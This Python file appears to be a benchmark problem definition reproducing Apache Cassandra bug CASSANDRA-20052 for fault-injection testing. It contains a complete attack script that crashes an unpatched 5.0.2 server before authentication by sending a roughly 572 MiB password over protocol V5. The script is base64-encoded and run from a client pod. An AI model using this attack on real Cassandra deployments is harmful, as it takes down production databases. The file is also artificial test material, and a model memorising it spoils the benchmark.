"""CASSANDRA-20052: size of CQL messages is not limited in the V5 native-protocol framing path.

JIRA: https://issues.apache.org/jira/browse/CASSANDRA-20052
Buggy: cassandra:5.0.2  ->  Fixed: cassandra:5.0.3 (also 4.1.8, 6.0).

Reproduced on the raw-ring infrastructure as a single hardened 5.0.2 server pod plus a client pod
(``replicas=0`` StatefulSet + two bare pods). The server runs ``authenticator: PasswordAuthenticator``
(so an AUTH_RESPONSE is actually exchanged) with a pinned 512M heap (so the direct-buffer pool limit
is the documented 536870912 bytes and the OOM is cheap and deterministic). ``inject_fault`` drives the
attack from the client pod using the DataStax python driver bundled in the image
(``/opt/cassandra/lib/cassandra-driver-internal-only-3.29.0.zip``, which supports
``ProtocolVersion.V5``): it connects over native protocol **V5** with a ~572 MiB
(600000000-char) password. Forcing V5 routes the oversized AUTH_RESPONSE through the buggy V5 framing
path (which has NO size limit), not the v4 path bounded by ``native_transport_max_frame_size``.

The 5.0.2 server buffers the whole oversized frame in ``FrameDecoder.stash`` and exhausts the 512MB
direct-buffer pool; Cassandra forces an ``OutOfMemoryError`` and the JVM's
``-XX:OnOutOfMemoryError="kill -9 %p"`` handler runs ``/bin/sh -c "kill -9 1"`` against the server = a
pre-auth denial-of-service. On fixed 5.0.3 the same oversized AUTH_RESPONSE is rejected at the framing
layer (``native_transport_max_auth_message_size``, default 128KiB) and the server stays responsive.

Root cause: the V5 native-protocol framing path enforces no message-size limit. The only size guard
(``native_transport_max_frame_size``, 16MiB) applies only to pre-V5 sessions / the initial
STARTUP/OPTIONS handshake and is never checked in V5 logic, so an unauthenticated client's oversized
AUTH_RESPONSE is buffered in ``FrameDecoder.stash()`` and exhausts the heap. The fix (PR #3655, 5.0.3)
adds ``native_transport_max_message_size`` and ``native_transport_max_auth_message_size`` (default
128KiB) to reject oversized (auth) messages at the framing layer.

VERBATIM BUGGY SIGNATURE (server log, ``epollEventLoopGroup`` thread):
  ERROR [epollEventLoopGroup-5-14] JVMStabilityInspector.java:186 - Force heap space OutOfMemoryError in the presence of
  java.lang.OutOfMemoryError: Cannot reserve 131081 bytes of direct buffer memory (allocated: 536796132, limit: 536870912)
      at org.apache.cassandra.utils.memory.BufferPool.allocate(BufferPool.java:238)
      at org.apache.cassandra.net.BufferPoolAllocator.getAtLeast(BufferPoolAllocator.java:75)
      at org.apache.cassandra.net.FrameDecoder.stash(FrameDecoder.java:336)
      at org.apache.cassandra.net.FrameDecoderWith8bHeader.decode(FrameDecoderWith8bHeader.java:131)
      at org.apache.cassandra.net.FrameDecoderCrc.decode(FrameDecoderCrc.java:150)
      at org.apache.cassandra.net.FrameDecoder.channelRead(FrameDecoder.java:283)
  # -XX:OnOutOfMemoryError="kill -9 %p"
  #   Executing /bin/sh -c "kill -9 1"...

The oracle greps the server's container log for the verbatim ``Force heap space OutOfMemoryError``
line that the unbounded V5 frame buffering forces; on fixed binaries the oversized message is rejected
and the line never appears.
"""

import base64
import logging
import time

from sregym.conductor.oracles.cassandra_raw_ring_oracles import CassandraLogGrepOracle
from sregym.conductor.problems.cassandra_raw_ring import CassandraRawRingProblem
from sregym.utils.decorators import mark_fault_injected

logger = logging.getLogger(__name__)

_SERVER = "cass-server"
_CLIENT = "cass-client"
_PW_LEN = 600000000  # ~572 MiB password -> oversized AUTH_RESPONSE that exceeds the 512MB direct-buffer pool
_SIGNATURE = r"Force heap space OutOfMemoryError"

# Server entrypoint: switch the stock AllowAllAuthenticator to PasswordAuthenticator (so an
# AUTH_RESPONSE is exchanged and the V5 framing path is reached) then run the node normally.
_SERVER_CMD = (
    "sed -ri 's/^authenticator:.*/authenticator: PasswordAuthenticator/' /etc/cassandra/cassandra.yaml || true\n"
    "exec docker-entrypoint.sh cassandra -f\n"
)

# Attack run inside the client pod via the image-bundled DataStax driver: connect over protocol V5
# with a 600000000-char password, emitting an oversized AUTH_RESPONSE before authentication completes.
_ATTACK = r"""
import glob, os, sys, zipfile
_z = glob.glob("/opt/cassandra/lib/cassandra-driver-internal-only-*.zip")[0]
_top = zipfile.ZipFile(_z).namelist()[0].split("/")[0]
sys.path.insert(0, os.path.join(_z, _top))
from cassandra import ProtocolVersion
from cassandra.auth import PlainTextAuthProvider
from cassandra.cluster import Cluster
target = sys.argv[1]
pw_len = int(sys.argv[2])
print("building %d-char password..." % pw_len, flush=True)
auth = PlainTextAuthProvider(username="cassandra", password="-" * pw_len)
cluster = Cluster([target], auth_provider=auth, protocol_version=ProtocolVersion.V5,
                  connect_timeout=60, control_connection_timeout=60)
try:
    cluster.connect()
    print("UNEXPECTED: connected", flush=True)
except Exception as e:
    print("client exception (expected after server OOM/DoS): %r" % e, flush=True)
"""


class AutoCassandra20052(CassandraRawRingProblem):
    """Unbounded V5 AUTH_RESPONSE OOM/DoS on a hardened 5.0.2 server, driven from a client pod.

    Realised through the benchmark architecture: ``deploy_app`` stands up a ``cassandra:5.0.2`` server
    bare pod (PasswordAuthenticator + 512M heap) and a client bare pod; ``inject_fault`` runs the
    bundled DataStax driver V5 attack (a ~572 MiB password) from the client, overflowing the server's
    direct-buffer pool in ``FrameDecoder.stash``; the ``CassandraLogGrepOracle`` greps the server log
    for the verbatim ``Force heap space OutOfMemoryError`` the unbounded frame buffering forces.
    """

    db_name = "cassandra"
    db_version = "5.0.2"
    cassandra_version = "5.0.2"
    source_git_ref = "cassandra-5.0.2"
    ring_namespace = "cassraw-20052"

    # No StatefulSet ring members — the bug is single-node. The hardened server and the attack client
    # are bare pods (a 512M heap pins the direct-buffer limit to the documented 536870912 bytes).
    replicas = 0
    extra_pods = [
        {"pod_name": _SERVER, "command": _SERVER_CMD, "env": {"MAX_HEAP_SIZE": "512M"}, "set_seeds": False},
        {"pod_name": _CLIENT, "command": "tail -f /dev/null\n", "set_seeds": False},
    ]

    root_cause_file = "src/java/org/apache/cassandra/net/FrameDecoder.java"
    root_cause_description = (
        "Size of CQL messages is not limited in the V5 native-protocol framing logic. The only size "
        "guard, native_transport_max_frame_size (16MiB), applies only to pre-V5 sessions / the initial "
        "STARTUP/OPTIONS handshake and is not checked in any V5 logic. As a result an *unauthenticated* "
        "client can send a huge AUTH_RESPONSE (e.g. a ~572 MiB / 600000015-byte password) over protocol "
        "v5; the server buffers the whole frame in FrameDecoder.stash() (BufferPoolAllocator.getAtLeast), "
        "exhausts the direct-buffer pool, and a forced OutOfMemoryError triggers the JVM's "
        '-XX:OnOutOfMemoryError="kill -9 %p" handler, killing the Cassandra process = pre-auth DoS. The '
        "fix (PR #3655, shipped in 5.0.3) adds native_transport_max_message_size and "
        "native_transport_max_auth_message_size (default 128KiB) to reject oversized (auth) messages."
    )

    def _server_auth_ready(self) -> bool:
        """True once PasswordAuthenticator has created the default superuser and CQL accepts it."""
        out = self.app.exec(
            _SERVER,
            "cqlsh -u cassandra -p cassandra -e 'SELECT release_version FROM system.local;'",
            timeout=60,
        )
        return "5.0.2" in out

    def post_deploy(self):
        """Wait until the PasswordAuthenticator server is up and the default superuser is usable."""
        for i in range(72):
            if self._server_auth_ready():
                logger.info(f"[20052] server auth-ready at t={i * 10}s")
                return
            time.sleep(10)
        logger.warning("[20052] server did not become auth-ready within timeout (attack may not fire)")

    @mark_fault_injected
    def inject_fault(self):
        """Send an oversized protocol-V5 AUTH_RESPONSE from the client to OOM/DoS the server."""
        server_ip = self.app.pod_ip(_SERVER)
        b64 = base64.b64encode(_ATTACK.encode()).decode()
        self.app.exec(_CLIENT, f"echo {b64} | base64 -d > /tmp/attack.py", timeout=30)
        logger.info(f"[20052] launching oversized V5 AUTH_RESPONSE attack at {server_ip} (pw_len={_PW_LEN})")
        out = self.app.exec(_CLIENT, f"python3 /tmp/attack.py {server_ip} {_PW_LEN}", timeout=300)
        logger.info(f"[20052] attack client output: {out.strip()[-300:]}")
        # Let the forced OOM land in the server log before grading.
        for _ in range(12):
            time.sleep(10)
            if self.app.grep_log(_SERVER, _SIGNATURE, source="pod_logs"):
                logger.info("[20052] inject_fault observed the forced-OOM signature on the server")
                return
        logger.warning("[20052] forced-OOM signature not yet observed (oracle will retry)")

    def build_mitigation_oracle(self):
        return CassandraLogGrepOracle(
            problem=self,
            pod=_SERVER,
            source="pod_logs",
            pattern=_SIGNATURE,
            attempts=8,
            retry_delay=15.0,
        )
